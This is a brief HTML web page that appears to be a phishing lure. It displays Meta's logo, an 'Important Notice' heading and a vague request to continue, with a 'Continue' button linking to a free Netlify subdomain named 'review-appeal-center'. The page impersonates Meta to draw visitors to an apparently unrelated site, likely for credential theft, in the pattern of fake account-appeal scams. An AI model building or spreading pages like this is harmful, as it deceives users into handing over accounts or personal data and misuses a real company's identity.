<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 35px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.12);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    .logo {
      width: 120px;
      margin-bottom: 15px;
      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.15));
    }

    h2 {
      margin-bottom: 10px;
      color: #333;
    }

    p {
      color: #666;
      font-size: 14px;
      line-height: 1.5;
    }

    .btn {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 25px;
      background: #0070f3;
      color: #fff;
      text-decoration: none;
      border-radius: 6px;
      font-weight: bold;
      transition: 0.3s;
    }

    .btn:hover {
      background: #0059c1;
    }
  </style>
</head>
<body>

<div class="box">

  <img
    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvM7rjqOWFPii9JiiuiRc56EJPsuFrvtfxoKXvKs3YImzA1-JIYCuLJbyD&s=10Meta-Logo.png"
    alt="Meta Logo"
    class="logo"
  >

  <h2>Important Notice</h2>

  <p>
    Please click the button below to continue your request.
  </p>

  <a class="btn" href="https://review-appeal-center.netlify.app/">Continue</a>

</div>

</body>
</html>
